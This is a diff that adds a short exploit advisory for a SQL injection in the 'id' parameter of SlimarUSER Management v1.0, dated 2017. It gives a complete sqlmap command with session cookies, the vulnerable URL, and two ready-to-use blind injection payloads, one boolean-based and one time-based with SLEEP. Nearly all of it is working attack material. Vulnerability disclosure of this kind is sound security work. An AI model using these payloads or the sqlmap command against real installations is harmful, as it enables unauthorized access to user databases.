@@ -1,0 +1,25 @@
+Exploit Title: SlimarUSER Management v1.0 – 'id' Parameter SQL Injection
+Date: 03.02.2017
+Vendor Homepage: http://slimar.org
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+SlimarUSER is a PHP user management system full with features. The system allows website owners to manage their own users with complete login, registration and many other features. It can be used on its own, or integrated into any existing PHP powered website.
+
+Sqlmap command: sqlmap.py -u "http://locahost/userman/inbox.php?p=view&id=7" --cookie="PHPSESSID=de3052c5dbb1d535d423ee1a2dbb076b; id=4; password=%242y%2410%24UuYt6q5GXU5UO37xc3j3GeN2ZM1hHB1sWqsAMs1DXAoeewSH.WYgq" --batch --random-agent --dbms=mysql
+
+Vulnerable Url: http://locahost/userman/inbox.php?p=view&id=[payload]
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: p=view&id=7' AND 6275=6275 AND 'DFYF'='DFYF
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: p=view&id=7' AND SLEEP(5) AND 'HCUm'='HCUm
+---
